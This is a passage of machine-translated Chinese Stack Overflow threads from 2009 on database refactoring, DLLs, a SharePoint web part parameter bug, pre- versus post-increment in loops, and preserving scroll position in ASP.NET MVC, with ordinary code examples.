你知道，我曾在一个系统上工作过，我们只是将旧的留在原地，然后添加新的并继续使用它。从长远来看，这会造成比进行更改然后更改所有对旧结构的引用更大的混乱。所以现在他们有一个系统，他们根本无法标准化任何新的东西，因为有四种不同的结构用于存储演讲者信息和两种不同的结构用于存储代表信息等。所以每一个微小的变化都必须由客户定制以后更难维护。这既不高效也不有效，而且维护起来也变得更加昂贵。咬紧牙关，找出会受到影响的内容，然后立即更改所有内容。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-27T19:00:08.150

[这是](http://www.infoq.com/presentations/ambler-database-refactoring)Scott Ambler 关于重构数据库的一个很好的介绍，他确实写[了一本](https://rads.stackoverflow.com/amzn/click/com/0321293533)关于重构数据库的书。

# dll - 什么是dll？

> ID：484452
> 
> 赞同：94
> 
> 时间：2009-01-27T17:50:36.903
> 
> 标签：dll

这可能是一个非常菜鸟的问题，但是在当今网络应用程序开发的世界中，许多程序员不需要处理太多的 dll，因此也不会费心去了解他们的目的。

那么什么是dll？

1.  这有什么用途？
2.  它是如何工作的？
3.  你如何创建一个？
4.  在什么情况下创建一个合适的？

有人告诉我 dll 用于存储函数库，但除此之外我知道的不多。希望这里有人能启发我，这样我终于可以停止想知道我的 Windows 目录中的所有 .dll 文件在做什么。

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2009-01-27T18:05:51.223

DLL 是一个动态链接库。它是代码和/或数据的集合，可由多个应用程序（或其他库/模块）使用。

因此，例如处理文件、使用 GUI 组件等的常用方法在库中可用，因此多个应用程序可以使用相同的功能。这不仅减少了多次构建相同内容的需要，而且还确保了应用程序之间的通用对话框是相同的。

库可以在运行时加载，从而在不同的并发应用程序之间共享。这称为动态链接。

在某些情况下，该库可以包含在应用程序本身中。这称为静态链接。静态链接以灵活性为代价使部署更容易，因为不同的应用程序将分别加载相同的 DLL 副本。

但是，静态链接并不总是一种选择。例如，您不能静态链接 .NET 应用程序。用户必须拥有 .NET 库才能运行 .NET 应用程序，并且库（或在 .NET 中调用的程序集）在运行时加载。

DLL 由用于创建应用程序的相同工具创建。具体细节很大程度上取决于所使用的工具。

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2009-06-26T04:25:00.250

DLL = 动态链接库

这个名字实际上很好地描述了他们的成就。

**图书馆**

允许您将特定问题域的代码隔离到一个位置。然后在多个应用程序之间共享它。该库可以随时更换为另一个库以修复错误或添加功能。

**关联**

您可以将库“链接”到应用程序，以便库中的逻辑不会直接编译到应用程序中。

**动态的**

该库可以按需加载。操作系统可以仅加载所需的部分，而不是将庞大的单个 EXE 加载到内存中。此外，如果在应用程序之间共享 DLL，操作系统可以优化库的加载方式并在应用程序之间共享它。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2011-08-19T03:08:19.587

[DLL（动态链接库）](http://www.registryfast.com/Dll_errors.html)文件可以描述为小的“子程序”，旨在帮助更大的程序运行良好。它们提供了一种将各种硬件和软件资源（在其运行时会话中的不同点）链接到它们所基于的主要可执行程序的方法，基于“按需”。这消除了在程序第一次运行时将与主可执行程序有关的所有内容加载到计算机的 RAM（随机存取存储器）的需要。

DLL 携带的软件资源包括用于保持程序运行并不真正需要的各种程序功能的代码：即，只需要在给定计算会话期间的特定时间调用并且实际上可能不需要的功能完全被调用。在程序第一次运行时将这些函数（对于给定程序可能有相当多的函数）加载到计算机的 RAM 中，然后在整个会话期间将它们保留在那里将浪费 RAM 空间——这被认为是溢价。

一大进步：

> DLL 的开发是计算领域的一项重大进步，因为在它们可用之前，与程序有关的所有内容（包括很少使用的函数）都必须在程序第一次加载时加载到 RAM 中。这导致计算效率极低，各种程序表现出较慢的速度。由于伴随的 RAM 压力，通过运行几个简单的程序来执行多任务也非常困难。

注意事项：

> DLL 通常是特定于版本的。那些适用于版本 1 的程序（或编程语言，可能是这种情况）可能不适用于版本 2。一般规则是旧版本中的 DLL 往往无法工作新版本很好，但新版本的那些通常可以很好地与旧版本的程序或编程语言一起工作。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2009-01-27T17:54:12.840

动态链接库。

举个例子，如果您将其他人的 DLL 加载到您的应用程序中，您可以使用其中的一些编程。

您可以加载一个 DLL，该 DLL 生成总是以“5”或其他东西开头的随机数。

在您的程序中，您可以调用 CrazyDLL.GenerateRandomNumbersSorta() 它将返回数字。

对于一个真实世界的例子，我有一个 DLL，它结合了 4 个文本框（您可以使用这些文本框来键入 IP 地址），它自动只接受小于 256 的数字，并处理按下退格键以跳转到前一个文本框。

我已经使用该代码创建了一个 DLL，现在我所要做的就是拖放更多这些 IP 地址文本框集合，而不必一遍又一遍地复制所有这些代码。

同一个 DLL 还具有将 IP 地址转换为十六进制字符串和其他有用代码的功能。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-27T17:57:17.700

从[MSDN 库](http://msdn.microsoft.com/en-us/library/ms682589(VS.85).aspx)：

*动态链接库 (DLL) 是包含可由另一个模块（应用程序或 DLL）使用的函数和数据的模块。*

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-27T18:02:07.690

DLL = 动态~~加载~~链接库。正如您所知道的，它基本上是函数、C++ 类和/或全局变量的集合。您可以静态加载 DLL（即操作系统在您的程序启动时自动加载它）或动态加载（您的程序显式加载它），此时 DLL 中的函数和内容可供您的程序使用。

创建一个类似于创建一个EXE，只是不需要一个`main()`函数。有链接器指令告诉链接器创建 DLL 而不是 EXE。

您想要这样做的主要原因是将一些代码封装在一个地方并从多个 exe 中使用它，而不是将代码链接到每个 exe 中。

一个有点历史的原因是你的 exe 可以更小，因为一些代码物理上位于不同的文件中。这意味着您的 exe 在内存中占用的空间量可以更小。在现代系统上，这个问题比以前少了，尽管它在 Windows Mobile 上仍然可能是一个问题。

# web-services - SharePoint Web 部件参数神秘消失

> ID：484457
> 
> 赞同：1
> 
> 时间：2009-01-27T17:52:41.797
> 
> 标签：web-services, sharepoint, sharepoint-2007, web-parts, parameters

好的，我有一个奇怪的问题，我现在在 WSS 3.0 中有一个 SharePoint WebPart，它使用 VB.NET 和 HttpWebRequest 对象查询 Yahoo Traffic 的 REST 接口。然而，我不断从雅虎收到一条错误消息，说我未经授权，经过进一步检查，我注意到它正在将以下 URL 传递给雅虎： [http ://local.yahooapis.com/MapsService/V1/trafficData?appid=&city =&状态=&半径=20](http://local.yahooapis.com/MapsService/V1/trafficData?appid=&city=&state=&radius=20)

## 参数设置如下：

私有 _AppID 作为字符串

```
 <Personalizable(True), WebBrowsable(True), WebDisplayName("Yahoo App ID"), WebDescription("Yahoo Application ID")> _
    Public Property AppID() As String
        Get
            Return _AppID

        End Get
        Set(ByVal value As String)
            _AppID = value
        End Set
    End Property

    Private _City As String
    <Personalizable(True), WebBrowsable(True), WebDisplayName("City"), WebDescription("City")> _
    Public Property City() As String
        Get
            Return _City

        End Get
        Set(ByVal value As String)
            _City = value
        End Set
    End Property

    Private _State As String
    <Personalizable(True), WebBrowsable(True), WebDisplayName("State"), WebDescription("State")> _
    Public Property State() As String
        Get
            Return _State

        End Get
        Set(ByVal value As String)
            _State = value
        End Set
    End Property

    Private _radius As String = "-1"
    <Personalizable(True), WebBrowsable(True), WebDisplayName("Radius (in miles)"), WebDescription("Radius in Miles")> _
    Public Property Radius() As String
        Get
            If _radius = "-1" Then
                Return "20"
            Else
                Return _radius
            End If

        End Get
        Set(ByVal value As String)
            _radius = value
        End Set 
```

## 结束属性

## 调用 REST 的代码是这样的：

```
 Dim Url As String = ""
        Try
            Dim aDoc As New d.DataSet
            Url = "http://local.yahooapis.com/MapsService/V1/trafficData?appid=" & Me.AppID & "&city=" & Me.City & "&state=" & Me.State & "&radius=" & Me.Radius
            Dim aRequest As n.HttpWebRequest = CType(n.HttpWebRequest.Create(Url), n.HttpWebRequest)
            Dim aResponse As n.HttpWebResponse
            aResponse = CType(aRequest.GetResponse(), n.HttpWebResponse)
            If aResponse.StatusCode <> Net.HttpStatusCode.OK Then
                Throw New Exception("Server Returned This Code" & aResponse.StatusCode.ToString() & aResponse.StatusDescription)
            End If
            aDoc.ReadXml(aResponse.GetResponseStream())
            Return aDoc
        Catch ex As Exception
            System.Diagnostics.EventLog.WriteEntry("YahooTrafficUtil", ex.Message & ex.StackTrace & Url)
            Dim aContext As System.Web.HttpContext = System.Web.HttpContext.Current
            aContext.Trace.Warn(ex.ToString() & ex.StackTrace)
            childException = ex
            Return Nothing 
```

## 结束尝试

这是在我无法访问以进行调试的测试服务器上，但我的开发服务器检查正常，一切都通过，没问题。

AppId、City 和 State 参数是我的 SharePoint Web 部件中列出的参数，但出于某种原因，尽管我填充了这些 Web 部件，但它们通过空白。人群中的任何想法？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T20:17:28.587

您是否尝试过不同的 WebPartStorage(Storage.Personal) [这默认为 Storage.Personal] 属性装饰？

我假设错误在于属性的存储而不是代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T22:00:16.163

找到它，它实际上是 default.master 文件的一个愚蠢问题，我终于设法弄清楚如何从 SharePoint 获取堆栈转储，当它因“损坏的 Web 部件”网页而失败并追踪其真实来源时。感谢所有尝试过的人！

# for-loop - 循环中预增量和后增量之间的区别？

> ID：484462
> 
> 赞同：329
> 
> 时间：2009-01-27T17:53:19.830
> 
> 标签：for-loop, language-agnostic, post-increment, pre-increment

`++i`循环和`i++`循环有区别`for`吗？它只是一个语法吗？

* * *

## 回答 #1

> 赞同：255
> 
> 时间：2009-01-27T18:18:36.393

**a++ 被称为后缀。**

a 加 1，返回旧值。

**++a 被称为前缀。**

a 加 1，返回新值。

C＃：

```
string[] items = {"a","b","c","d"};
int i = 0;
foreach (string item in items)
{
    Console.WriteLine(++i);
}
Console.WriteLine("");

i = 0;
foreach (string item in items)
{
    Console.WriteLine(i++);
} 
```

输出：

```
1
2
3
4

0
1
2
3 
```

`foreach`和`while`循环取决于您使用的增量类型。对于像下面这样的 for 循环，它没有任何区别，因为您没有使用 i 的返回值：

```
for (int i = 0; i < 5; i++) { Console.Write(i);}
Console.WriteLine("");
for (int i = 0; i < 5; ++i) { Console.Write(i); } 
```

> 0 1 2 3 4
> 0 1 2 3 4

如果使用评估的值，则增量类型变得重要：

```
int n = 0;
for (int i = 0; n < 5; n = i++) { } 
```

* * *

## 回答 #2

> 赞同：232
> 
> 时间：2009-01-27T18:00:08.693

**预增量 ++i**增加 i 的值并计算新的增量值。

```
int i = 3;
int preIncrementResult = ++i;
Assert( preIncrementResult == 4 );
Assert( i == 4 ); 
```

**后递增 i++**递增 i 的值并计算为原始的非递增值。

```
int i = 3;
int postIncrementResult = i++;
Assert( postIncrementtResult == 3 );
Assert( i == 4 ); 
```

* * *

在 C++ 中，预增量通常是首选，您可以使用其中任何一个。

这是因为如果您使用后增量，它可能要求编译器必须生成创建额外临时变量的代码。这是因为要递增的变量的先前值和新值都需要保存在某个地方，因为它们可能在正在评估的表达式中的其他地方需要。

因此，至少在 C++ 中，可能存在指导您选择使用哪个性能的差异。

这主要是仅当被递增的变量是用户定义的类型且具有覆盖的 ++ 运算符时才会出现问题。对于原始类型（int 等），没有性能差异。但是，值得坚持使用前增量运算符作为指导，除非绝对需要后增量运算符。

[这里](https://web.archive.org/web/20170405054235/http://en.allexperts.com/q/C-1040/Increment-operators.htm)还有一些讨论。

在 C++ 中，如果您使用的是 STL，那么您可能会使用带有迭代器的 for 循环。这些主要具有覆盖的 ++ 运算符，因此坚持预增量是一个好主意。编译器一直在变得更聪明，并且较新的编译器可能能够执行优化，这意味着没有性能差异 - 特别是如果正在递增的类型是在头文件中内联定义的（因为 STL 实现通常是这样），以便编译器可以看到如何该方法被实施，然后可以知道哪些优化可以安全地执行。即便如此，可能仍然值得坚持预增量，因为循环会执行很多次，这意味着小的性能损失很快就会被放大。

* * *

在无法重载 ++ 运算符的其他语言（例如 C#）中，没有性能差异。在循环中用于推进循环变量，前后自增运算符是等价的。

更正：允许在 C# 中重载 ++。不过，与 C++ 相比，在 C# 中，您似乎不能独立地重载 pre 和 post 版本。因此，我假设如果在 C# 中调用 ++ 的结果未分配给变量或用作复杂表达式的一部分，那么编译器会将 ++ 的前后版本减少为执行等效的代码。

* * *

## 回答 #3

> 赞同：87
> 
> 时间：2009-01-27T17:56:44.627

*在 C#中，在 for 循环中使用时*没有区别。

```
for (int i = 0; i < 10; i++) { Console.WriteLine(i); } 
```

输出相同的东西

```
for (int i = 0; i < 10; ++i) { Console.WriteLine(i); } 
```

正如其他人指出的那样，一般使用时 i++ 和 ++i 有一个微妙但显着的区别：

```
int i = 0;
Console.WriteLine(i++);   // Prints 0
int j = 0;
Console.WriteLine(++j);   // Prints 1 
```

i++ 读取 i 的值，然后将其递增。

++i 增加 i 的值，然后读取它。

* * *

## 回答 #4

> 赞同：61
> 
> 时间：2016-03-29T21:20:36.110

问题是：

> for 循环中的 ++i 和 i++ 有区别吗？

答案是：**没有**。

为什么甚至没有问到每个其他答案都必须详细解释前后递增？

这个for循环：

```
for (int i = 0; // Initialization
     i < 5;     // Condition
     i++)       // Increment
{
   Output(i);
} 
```

在不使用循环的情况下转换为这段代码：

```
int i = 0; // Initialization

loopStart:
if (i < 5) // Condition
{
   Output(i);

   i++ or ++i; // Increment

   goto loopStart;
} 
```

现在，如果你把`i++`或`++i`作为增量在这里有关系吗？**不，**因为增量操作的返回值无关紧要。`i`将在 for 循环体内的代码执行后递增。

* * *

## 回答 #5

> 赞同：30
> 
> 时间：2009-01-27T18:02:10.327

既然您询问循环中的差异，我想您的意思是

```
for(int i=0; i<10; i++) 
    ...; 
```

在这种情况下，您在大多数语言中没有区别：无论您是否编写`i++`和，循环的行为都是相同的`++i`。在 C++ 中，您可以编写自己的 ++ 运算符版本，并且可以为它们定义单独的含义，如果它们`i`是用户定义的类型（例如，您自己的类）。

上面没关系的原因是因为你没有使用`i++`. 另一件事是当你做

```
for(int i=0, a = 0; i<10; a = i++) 
    ...; 
```

现在，有*一个*区别，因为正如其他人指出的那样，`i++`表示*增量，但评估为先前的值*，但`++i`表示*增量，但评估为`i`*（因此它将评估为新值）。在上述情况下，`a`i 被分配了先前的值，而 i 递增。

* * *

## 回答 #6

> 赞同：15
> 
> 时间：2009-01-27T18:22:47.057

正如此代码所示（请参阅注释中的已解密 MSIL），C# 3 编译器在 for 循环中不区分 i++ 和 ++i。如果取 i++ 或 ++i 的值，肯定会有差异（这是在 Visutal Studio 2008 / Release Build 中编译的）：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace PreOrPostIncrement
{
    class Program
    {
        static int SomethingToIncrement;

        static void Main(string[] args)
        {
            PreIncrement(1000);
            PostIncrement(1000);
            Console.WriteLine("SomethingToIncrement={0}", SomethingToIncrement);
        }

        static void PreIncrement(int count)
        {
            /*
            .method private hidebysig static void  PreIncrement(int32 count) cil managed
            {
              // Code size       25 (0x19)
              .maxstack  2
              .locals init ([0] int32 i)
              IL_0000:  ldc.i4.0
              IL_0001:  stloc.0
              IL_0002:  br.s       IL_0014
              IL_0004:  ldsfld     int32 PreOrPostIncrement.Program::SomethingToIncrement
              IL_0009:  ldc.i4.1
              IL_000a:  add
              IL_000b:  stsfld     int32 PreOrPostIncrement.Program::SomethingToIncrement
              IL_0010:  ldloc.0
              IL_0011:  ldc.i4.1
              IL_0012:  add
              IL_0013:  stloc.0
              IL_0014:  ldloc.0
              IL_0015:  ldarg.0
              IL_0016:  blt.s      IL_0004
              IL_0018:  ret
            } // end of method Program::PreIncrement             
             */
            for (int i = 0; i < count; ++i)
            {
                ++SomethingToIncrement;
            }
        }

        static void PostIncrement(int count)
        {
            /*
                .method private hidebysig static void  PostIncrement(int32 count) cil managed
                {
                  // Code size       25 (0x19)
                  .maxstack  2
                  .locals init ([0] int32 i)
                  IL_0000:  ldc.i4.0
                  IL_0001:  stloc.0
                  IL_0002:  br.s       IL_0014
                  IL_0004:  ldsfld     int32 PreOrPostIncrement.Program::SomethingToIncrement
                  IL_0009:  ldc.i4.1
                  IL_000a:  add
                  IL_000b:  stsfld     int32 PreOrPostIncrement.Program::SomethingToIncrement
                  IL_0010:  ldloc.0
                  IL_0011:  ldc.i4.1
                  IL_0012:  add
                  IL_0013:  stloc.0
                  IL_0014:  ldloc.0
                  IL_0015:  ldarg.0
                  IL_0016:  blt.s      IL_0004
                  IL_0018:  ret
                } // end of method Program::PostIncrement
             */
            for (int i = 0; i < count; i++)
            {
                SomethingToIncrement++;
            }
        }
    }
} 
```

* * *

## 回答 #7

> 赞同：14
> 
> 时间：2009-01-27T17:55:54.490

一 (++i) 是前增量，一 (i++) 是后增量。不同之处在于表达式立即返回什么值。

```
// Psuedocode
int i = 0;
print i++; // Prints 0
print i; // Prints 1
int j = 0;
print ++j; // Prints 1
print j; // Prints 1 
```

编辑：糟糕，完全忽略了循环方面的事情。当它是“步骤”部分（for（...; ...;））时，for循环没有实际区别，但它可以在其他情况下发挥作用。

* * *

## 回答 #8

> 赞同：8
> 
> 时间：2009-01-27T22:31:27.130

这是一个 Java 示例，字节码、后增量和前增量显示字节码没有区别：

```
public class PreOrPostIncrement {

    static int somethingToIncrement = 0;

    public static void main(String[] args) {
        final int rounds = 1000;
        postIncrement(rounds);
        preIncrement(rounds);
    }

    private static void postIncrement(final int rounds) {
        for (int i = 0; i < rounds; i++) {
            somethingToIncrement++;
        }
    }

    private static void preIncrement(final int rounds) {
        for (int i = 0; i < rounds; ++i) {
            ++somethingToIncrement;
        }
    }
} 
```

现在对于字节码（javap -private -c PreOrPostIncrement）：

```
public class PreOrPostIncrement extends java.lang.Object{
static int somethingToIncrement;

static {};
Code:
0:  iconst_0
1:  putstatic   #10; //Field somethingToIncrement:I
4:  return

public PreOrPostIncrement();
Code:
0:  aload_0
1:  invokespecial   #15; //Method java/lang/Object."<init>":()V
4:  return

public static void main(java.lang.String[]);
Code:
0:  sipush  1000
3:  istore_1
4:  sipush  1000
7:  invokestatic    #21; //Method postIncrement:(I)V
10: sipush  1000
13: invokestatic    #25; //Method preIncrement:(I)V
16: return

private static void postIncrement(int);
Code:
0:  iconst_0
1:  istore_1
2:  goto    16
5:  getstatic   #10; //Field somethingToIncrement:I
8:  iconst_1
9:  iadd
10: putstatic   #10; //Field somethingToIncrement:I
13: iinc    1, 1
16: iload_1
17: iload_0
18: if_icmplt   5
21: return

private static void preIncrement(int);
Code:
0:  iconst_0
1:  istore_1
2:  goto    16
5:  getstatic   #10; //Field somethingToIncrement:I
8:  iconst_1
9:  iadd
10: putstatic   #10; //Field somethingToIncrement:I
13: iinc    1, 1
16: iload_1
17: iload_0
18: if_icmplt   5
21: return

} 
```

* * *

## 回答 #9

> 赞同：7
> 
> 时间：2015-06-28T05:56:14.343

如果您在循环中不使用增量后的值，则没有区别。

```
for (int i = 0; i < 4; ++i){
cout<<i;       
}
for (int i = 0; i < 4; i++){
cout<<i;       
} 
```

两个循环都将打印 0123。

但是，当您在循环中使用递增/递减后的值时，区别就来了，如下所示：

预增量循环：

```
for (int i = 0,k=0; i < 4; k=++i){
cout<<i<<" ";       
cout<<k<<" "; 
} 
```

输出：0 0 1 1 2 2 3 3

后增量循环：

```
for (int i = 0, k=0; i < 4; k=i++){
cout<<i<<" ";       
cout<<k<<" "; 
} 
```

输出：0 0 1 0 2 1 3 2

我希望通过比较输出可以清楚地看出差异。这里要注意的是，递增/递减总是在 for 循环结束时执行，因此可以解释结果。

* * *

## 回答 #10

> 赞同：5
> 
> 时间：2009-01-27T17:57:40.663

就在这里。不同之处在于返回值。"++i" 的返回值将是递增 i*后的值。*“i++”的返回值将是递增*前的值。*这意味着代码如下所示：

```
int a = 0;
int b = ++a; // a is incremented and the result after incrementing is saved to b.
int c = a++; // a is incremented again and the result before incremening is saved to c. 
```

因此，a 为 2，b 和 c 均为 1。

我可以像这样重写代码：

```
int a = 0; 

// ++a;
a = a + 1; // incrementing first.
b = a; // setting second. 

// a++;
c = a; // setting first. 
a = a + 1; // incrementing second. 
```

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2009-01-27T17:58:16.950

在这两种情况下没有实际区别 ' `i`' 将增加 1。

但是在表达式中使用它时会有所不同，例如：

```
int i = 1;
int a = ++i;
// i is incremented by one and then assigned to a.
// Both i and a are now 2.
int b = i++;
// i is assigned to b and then incremented by one.
// b is now 2, and i is now 3 
```

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2009-01-27T19:32:39.880

++i 和 i++ 不仅仅是循环和性能差异。++i 返回一个左值，而 i++ 返回一个右值。基于此，您可以对 (++i) 做很多事情，但对 (i++) 则不行。

```
1- It is illegal to take the address of post increment result. Compiler won't even allow you.
2- Only constant references to post increment can exist, i.e., of the form const T&.
3- You cannot apply another post increment or decrement to the result of i++, i.e., there is no such thing as I++++. This would be parsed as ( i ++ ) ++ which is illegal.
4- When overloading pre-/post-increment and decrement operators, programmers are encouraged to define post- increment/decrement operators like:

T& operator ++ ( )
{
   // logical increment
   return *this;
}

const T operator ++ ( int )
{
    T temp( *this );
    ++*this;
    return temp;
} 
```

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2016-10-17T02:20:17.830

这让我难以置信，为什么人们可以将 for-loop 中的增量表达式写为 i++。

在 for 循环中，当第三个组件是一个简单的增量语句时，如

```
for (i=0; i<x; i++) 
```

或者

```
for (i=0; i<x; ++i) 
```

结果执行没有区别。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2009-01-27T18:03:53.163

正如[@Jon B](https://stackoverflow.com/questions/484462/difference-between-i-and-i-in-a-loop#484479)所说，for 循环没有区别。

但是在`while`or`do...while`循环中，如果您与`++i`or进行比较，您可能会发现一些差异`i++`

```
while(i++ < 10) { ... } //compare then increment

while(++i < 10) { ... } //increment then compare 
```

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2009-01-27T20:04:50.547

在 javascript 中由于以下 i++ 可能更好用：

```
var i=1;
alert(i++); // before, 1\. current, 1\. after, 2.
alert(i); // before, 2\. current, 2\. after, 2.
alert(++i); // before, 2\. current, 3 after, 3. 
```

虽然数组（我认为全部）和其他一些函数和调用使用 0 作为起点，但您必须将 i 设置为 -1 以使循环在使用**++i**时与数组一起工作。

使用**i++**时，以下值将使用增加的值。您可以说**i++**是人类计数的方式，因为您可以从**0**开始。

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2019-12-04T09:17:14.783

> 了解**FOR**循环的作用

![在此处输入图像描述](https://i.stack.imgur.com/LAKa1.png)

> 上图显示**FOR**可以转换为**WHILE**，因为它们最终具有完全相同的汇编代码（至少在 gcc 中）。因此，我们可以将**FOR**分解为几部分，以了解它的作用。

```
for (i = 0; i < 5; ++i) {
  DoSomethingA();
  DoSomethingB();
} 
```

等于**WHILE**版本

```
i = 0; //first argument (a statement) of for
while (i < 5 /*second argument (a condition) of for*/) {
  DoSomethingA();
  DoSomethingB();
  ++i; //third argument (another statement) of for
} 
```

* * *

> 这意味着您可以将**FOR**用作**WHILE**的简单版本：
> 
> 1.  **FOR** (int i)的第一个参数在循环之前在外部执行。
>     
>     
> 2.  **FOR**的第三个参数（i++ 或 ++i）在循环的**最后一行**内部执行。
>     
>     
> 
> TL:DR: 不管是`i++`还是`++i`，我们都知道当它们独立时，它们没有区别，只是对它们自己+1。
> 
> 在学校，他们通常教授 i++ 方式，但也有很多人更喜欢 ++i 方式，原因有[几个](https://www.quora.com/Do-you-use-i++-or-++i-in-a-for-loop-And-why)。
> 
> **注意：**过去 i++ 对性能的影响很小，因为它不仅自己加一，而且在寄存器中保持原来的值。但就目前而言，这没有什么区别，因为编译器使加一部分相同。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2009-01-27T18:35:38.963

循环可能会有所不同。这是后/前增量的实际应用。

```
 int i = 0;
        while(i++ <= 10) {
            Console.Write(i);
        }
        Console.Write(System.Environment.NewLine);

        i = 0;
        while(++i <= 10) {
            Console.Write(i);
        }
        Console.ReadLine(); 
```

虽然第一个计数到 11 并循环 11 次，但第二个不计数。

大多数情况下，这是在一个简单的 while(x-- > 0) 中使用；- - 循环以迭代例如数组的所有元素（此处不包括 foreach-constructs）。

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2014-11-21T21:08:46.737

他们都增加了数字。`++i`相当于`i = i + 1`。

`i++`并且`++i`非常相似但不完全相同。两者都增加数字，但`++i`在评估当前表达式之前增加数字，而`i++`在评估表达式之后增加数字。

```
int i = 3;
int a = i++; // a = 3, i = 4
int b = ++a; // b = 4, a = 
```

检查[此链接](https://stackoverflow.com/questions/2315705/what-is-the-difference-between-i-i-in-for-loop-java/2315717#2315717)。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2017-03-11T18:01:26.710

`++i`是的，循环和循环之间是有区别`i++`的`for`，尽管在不寻常的用例中；当*在 for 块*或*循环测试表达式*中使用具有递增/递减运算符的循环变量时，或*与循环变量之一一起使用时*。不，它不仅仅是一个语法问题。

正如`i`在代码中意味着评估表达式`i`，运算符并不意味着评估，而只是一个操作；

*   `++i`表示将值递增`i`1 并稍后评估`i`,
*   `i++`表示评估`i`并稍后将值增加`i`1。

因此，从每两个表达式中获得的内容不同，因为每个表达式的评估内容不同。`--i`和_`i--`

例如;

```
let i = 0

i++ // evaluates to value of i, means evaluates to 0, later increments i by 1, i is now 1
0
i
1
++i // increments i by 1, i is now 2, later evaluates to value of i, means evaluates to 2
2
i
2 
```

在不寻常的用例中，但是下一个示例听起来有用与否无关紧要，它显示了差异

```
for(i=0, j=i; i<10; j=++i){
    console.log(j, i)
}

for(i=0, j=i; i<10; j=i++){
    console.log(j, i)
} 
```

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2021-03-22T15:05:02.677

在某些情况下 ++i 和 i+1 可能会给出不同的结果，--i、i - 1 等也是如此。

这并不是因为递增和递减运算符的工作方式存在缺陷，而是因为新程序员有时会忽略一个小事实。

根据经验，不要在数组的方括号内使用 inc/dec。例如，我不会用 arr[++i] 代替 arr[i + 1]。虽然两者都会得到相同的 i 值，但我们在这里忽略了一些东西。

如果循环条件基于 i 的执行值，则将 arr[i + 1] 替换为 arr[++i] 将导致错误。为什么？

假设 i = 5，那么 arr[i + 1] 将意味着 arr[6] 和 arr[++i] 虽然意味着 arr[6] 但也会将 i 的值更改为 6，这可能不是我们想做。我们可能不想更改 i 的值，但由于一个简单的 ++/-- 运算符，我们更改了值。

所以在使用 ++/-- 运算符时要小心。

我希望，我能够使我的观点易于理解。

* * *

## 回答 #21

> 赞同：-2
> 
> 时间：2009-01-27T18:16:50.250

对于`i`用户定义类型的 ，这些运算符可以（但*不应该*）在循环索引的上下文中具有有意义的不同语义，这可能（但不应该）影响所描述的循环的行为。

此外，`c++`通常使用预增量形式 ( `++i`) 是最安全的，因为它更容易优化。（[斯科特朗厄姆击败了我这个花絮](https://stackoverflow.com/questions/484462/difference-between-i-and-i-in-a-loop#484492)。诅咒你，斯科特）

* * *

## 回答 #22

> 赞同：-2
> 
> 时间：2015-10-12T09:09:05.577

我不知道其他语言，但在 Java 中**++i**是**前缀增量**，这意味着：将**i**增加1，然后在**i**所在的表达式中使用 i 的新值，而**i++**是**后缀增量**，这意味着以下：在表达式中使用**i**的当前值，然后将其增加 1。示例：

```
public static void main(String [] args){

    int a = 3;
    int b = 5;
    System.out.println(++a);
    System.out.println(b++);
    System.out.println(b); 
```

并且输出是：

*   4
*   5
*   6

* * *

## 回答 #23

> 赞同：-3
> 
> 时间：2016-11-30T15:33:16.197

我++; ++i ; 两者相似，因为它们没有在表达式中使用。

```
class A {

     public static void main (String []args) {

     int j = 0 ;
     int k = 0 ;
     ++j;
     k++;
    System.out.println(k+" "+j);

}}

prints out :  1 1 
```

# html - 如何在 MVC 中保持滚动位置？

> ID：484463
> 
> 赞同：28
> 
> 时间：2009-01-27T17:53:24.243
> 
> 标签：html, asp.net-mvc, model-view-controller, scroll-position

我在 MVC 中从事一个项目，并且很喜欢学习它。有一些成长的痛苦，但一旦你弄清楚它们就不错了。在 WebForms 世界中真正简单的一件事是保持页面上的滚动位置。您只需将 MaintainScrollPositionOnPostback 属性设置为 true。但是，在 MVC 中，我不使用回发，所以这对我不起作用。处理这个的标准方法是什么？

**编辑：** Ajax 是可以接受的，但我也想知道如果没有 AJAX 你会怎么做。

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2013-04-25T08:10:01.767

我已经在 J​​S 中解决了这个问题：

```
$(document).scroll(function(){
    localStorage['page'] = document.URL;
    localStorage['scrollTop'] = $(document).scrollTop();
}); 
```

然后在准备好的文件中：

```
$(document).ready(function(){
    if (localStorage['page'] == document.URL) {
        $(document).scrollTop(localStorage['scrollTop']);
    }
}); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-04T17:49:40.357

MaintainScrollPositionOnPostback 的工作方式是它有一对隐藏字段：__SCROLLPOSITIONX 和 __SCROLLPOSITIONY

在回发时，它设置这些，

```
function WebForm_GetScrollY() {
if (__nonMSDOMBrowser) {
    return window.pageYOffset;
}
else {
    if (document.documentElement && document.documentElement.scrollTop) {
        return document.documentElement.scrollTop;
    }
    else if (document.body) {
        return document.body.scrollTop;
    }
}
return 0;
}
function WebForm_SaveScrollPositionSubmit() {
    if (__nonMSDOMBrowser) {
        theForm.elements['__SCROLLPOSITIONY'].value = window.pageYOffset;
        theForm.elements['__SCROLLPOSITIONX'].value = window.pageXOffset;
    }
    else {
        theForm.__SCROLLPOSITIONX.value = WebForm_GetScrollX();
        theForm.__SCROLLPOSITIONY.value = WebForm_GetScrollY();
    }
    if ((typeof(this.oldSubmit) != "undefined") && (this.oldSubmit != null)) {
        return this.oldSubmit();
    }
    return true;
    } 
```

然后它调用RestoreScrollPosition：

```
function WebForm_RestoreScrollPosition() {
    if (__nonMSDOMBrowser) {
